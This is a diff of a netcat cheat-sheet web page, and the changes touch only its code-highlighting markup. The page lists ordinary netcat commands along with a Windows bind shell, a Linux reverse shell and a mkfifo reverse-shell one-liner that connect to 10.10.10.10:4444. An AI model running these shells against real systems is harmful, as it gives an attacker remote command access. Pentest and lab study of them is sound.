@@ -126,58 +126,58 @@
 <p><strong>Netcat</strong> is the utility knife of TCP/IP networking. It reads and writes data across network connections.</p>
 <h2>Top 10 Useful Commands</h2>
 <h3>1. Listen (Server)</h3>
-<pre class="codehilite"><code class="language-bash">nc -lvnp 4444
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Listen (<code>-l</code>), verbose (<code>-v</code>), no-resolve (<code>-n</code>), port 4444 (<code>-p</code>). Used to catch reverse shells.</p>
 <h3>2. Connect (Client)</h3>
-<pre class="codehilite"><code class="language-bash">nc 10.10.10.10 80
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span><span class="m">80</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Connect to port 80. You can type manual HTTP requests here.</p>
 <h3>3. File Transfer (Receive)</h3>
-<pre class="codehilite"><code class="language-bash">nc -lvnp 4444 &gt; outfile.txt
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span><span class="w"> </span>&gt;<span class="w"> </span>outfile.txt
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Save received data to file.</p>
 <h3>4. File Transfer (Send)</h3>
-<pre class="codehilite"><code class="language-bash">nc 10.10.10.10 4444 &lt; infile.txt
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span><span class="m">4444</span><span class="w"> </span>&lt;<span class="w"> </span>infile.txt
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Pipe file content into the connection.</p>
 <h3>5. Port Scan</h3>
-<pre class="codehilite"><code class="language-bash">nc -zv 10.10.10.10 1-1000
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span>-zv<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span><span class="m">1</span>-1000
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Zero-I/O (<code>-z</code>) scan. checks if ports are open.</p>
 <h3>6. Banner Grabbing</h3>
-<pre class="codehilite"><code class="language-bash">nc -v 10.10.10.10 22
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span>-v<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span><span class="m">22</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Connects and prints the service banner (e.g., SSH version).</p>
 <h3>7. Bind Shell (Windows)</h3>
-<pre class="codehilite"><code class="language-bash">nc -lvnp 4444 -e cmd.exe
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>cmd.exe
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Executes cmd.exe and sends I/O to connection. Dangerous.</p>
 <h3>8. Reverse Shell (Linux)</h3>
-<pre class="codehilite"><code class="language-bash">nc 10.10.10.10 4444 -e /bin/bash
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Connects back to attacker and exposes bash.</p>
 <h3>9. UDP Mode</h3>
-<pre class="codehilite"><code class="language-bash">nc -u -lvnp 4444
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span>-u<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Listen on UDP instead of TCP.</p>
 <h3>10. Chat</h3>
-<pre class="codehilite"><code class="language-bash"># Run nc on both sides
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Run nc on both sides</span>
+</code></pre></div>
 
 <p><strong>Explanation:</strong> Simple text chat between two machines.</p>
 <h2>The Most Powerful Command</h2>
-<pre class="codehilite"><code class="language-bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4444 &gt;/tmp/f
-</code></pre>
+<div class="codehilite"><pre><span></span><code>rm<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span>cat<span class="w"> </span>/tmp/f<span class="p">|</span>/bin/sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span><span class="m">4444</span><span class="w"> </span>&gt;/tmp/f
+</code></pre></div>
 
 <p><strong>Explanation:</strong> The "Netcat without -e" flag reverse shell. This one-liner creates a pipe to send shell output to netcat and read input from netcat, bypassing modern limitations.</p>
         </div>
